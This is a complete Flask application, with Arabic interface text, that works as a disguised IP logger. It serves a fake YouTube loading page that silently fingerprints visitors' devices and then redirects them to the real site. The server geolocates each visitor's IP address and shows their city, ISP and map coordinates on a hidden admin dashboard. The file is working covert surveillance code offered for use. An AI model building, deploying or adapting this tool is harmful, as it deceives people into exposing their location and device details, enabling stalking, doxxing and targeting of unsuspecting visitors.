import os
import sqlite3
import requests
from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)
DB = os.environ.get("DB_PATH", "hits.db")

def init_db():
    con = sqlite3.connect(DB)
    con.execute("""
        CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts TEXT, ip TEXT, country TEXT, region TEXT, city TEXT,
            isp TEXT, lat REAL, lon REAL, ua TEXT, lang TEXT,
            referer TEXT, path TEXT, screen TEXT, platform TEXT,
            timezone TEXT, gpu TEXT, ram TEXT, cores TEXT
        )
    """)
    con.commit()
    con.close()

init_db()

def geo(ip):
    try:
        if ip.startswith(("127.", "10.", "192.168.", "172.")):
            return {"country": "LAN", "region": "-", "city": "-",
                    "isp": "-", "lat": 0, "lon": 0}
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,"
            f"city,isp,lat,lon", timeout=5,
        ).json()
        if r.get("status") == "success":
            return {"country": r.get("country", "-"),
                    "region": r.get("regionName", "-"),
                    "city": r.get("city", "-"),
                    "isp": r.get("isp", "-"),
                    "lat": r.get("lat", 0), "lon": r.get("lon", 0)}
    except Exception:
        pass
    return {"country": "-", "region": "-", "city": "-",
            "isp": "-", "lat": 0, "lon": 0}

LANDING = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>YouTube</title>
<style>
  body{margin:0;background:#0f0f0f;color:#fff;font-family:Roboto,sans-serif;
       display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
  .logo{font-size:48px;font-weight:bold;margin-bottom:30px}
  .logo span{color:#ff0000}
  .spin{width:50px;height:50px;border:4px solid #333;border-top-color:#ff0000;
        border-radius:50%;animation:s 1s linear infinite;margin-bottom:20px}
  @keyframes s{to{transform:rotate(360deg)}}
  p{color:#aaa;font-size:14px}
</style>
</head>
<body>
<div class="logo">You<span>Tube</span></div>
<div class="spin"></div>
<p>جاري تحميل الفيديو...</p>
<script>
const fp = {
  screen: screen.width + "x" + screen.height,
  platform: navigator.platform,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  lang: navigator.language,
  cores: navigator.hardwareConcurrency || "?",
  ram: navigator.deviceMemory || "?",
};
try {
  const c = document.createElement("canvas");
  const gl = c.getContext("webgl");
  const dbg = gl.getExtension("WEBGL_debug_renderer_info");
  fp.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
} catch(e) { fp.gpu = "?"; }
fetch("/collect", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify(fp)
}).finally(() => {
  setTimeout(() => { window.location.href = "https://www.youtube.com"; }, 1200);
});
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(LANDING)

@app.route("/watch")
def watch():
    return render_template_string(LANDING)

@app.route("/watch/<vid>")
def watch_vid(vid):
    return render_template_string(LANDING)

@app.route("/collect", methods=["POST"])
def collect():
    ip = (request.headers.get("X-Forwarded-For", request.remote_addr) or "").split(",")[0].strip()
    g = geo(ip)
    fp = request.get_json(silent=True) or {}
    con = sqlite3.connect(DB)
    con.execute("""
        INSERT INTO hits (ts,ip,country,region,city,isp,lat,lon,ua,lang,
                          referer,path,screen,platform,timezone,gpu,ram,cores)
        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
    """, (
        datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        ip, g["country"], g["region"], g["city"], g["isp"],
        g["lat"], g["lon"],
        request.headers.get("User-Agent", "-"), fp.get("lang", "-"),
        request.headers.get("Referer", "-"), request.path,
        fp.get("screen", "-"), fp.get("platform", "-"),
        fp.get("timezone", "-"), fp.get("gpu", "-"),
        str(fp.get("ram", "-")), str(fp.get("cores", "-")),
    ))
    con.commit()
    con.close()
    return "", 204

DASH = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>الزيارات</title>
<style>
  body{background:#111;color:#eee;font-family:monospace;padding:20px}
  h1{color:#0f0}
  table{border-collapse:collapse;width:100%;font-size:12px}
  th,td{border:1px solid #333;padding:6px;text-align:right}
  th{background:#222;color:#0f0}
  tr:nth-child(even){background:#1a1a1a}
  a{color:#0ff}
</style>
</head>
<body>
<h1>► الزيارات — {{ rows|length }} إجمالي</h1>
<table>
<tr>
  <th>#</th><th>الوقت</th><th>IP</th><th>الدولة</th><th>المدينة</th>
  <th>ISP</th><th>الإحداثيات</th><th>الجهاز</th><th>كرت الشاشة</th>
  <th>المنطقة الزمنية</th><th>الخريطة</th>
</tr>
{% for r in rows %}
<tr>
  <td>{{ r[0] }}</td><td>{{ r[1] }}</td><td>{{ r[2] }}</td>
  <td>{{ r[3] }}</td><td>{{ r[5] }}</td><td>{{ r[6] }}</td>
  <td>{{ r[7] }}, {{ r[8] }}</td>
  <td>{{ r[13] }} / {{ r[14] }}</td>
  <td>{{ r[16] }}</td><td>{{ r[15] }}</td>
  <td><a href="https://maps.google.com/?q={{ r[7] }},{{ r[8] }}" target="_blank">الخريطة</a></td>
</tr>
{% endfor %}
</table>
</body>
</html>
"""

@app.route("/admin-secret-redz")
def dashboard():
    con = sqlite3.connect(DB)
    rows = con.execute("SELECT * FROM hits ORDER BY id DESC LIMIT 500").fetchall()
    con.close()
    return render_template_string(DASH, rows=rows)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
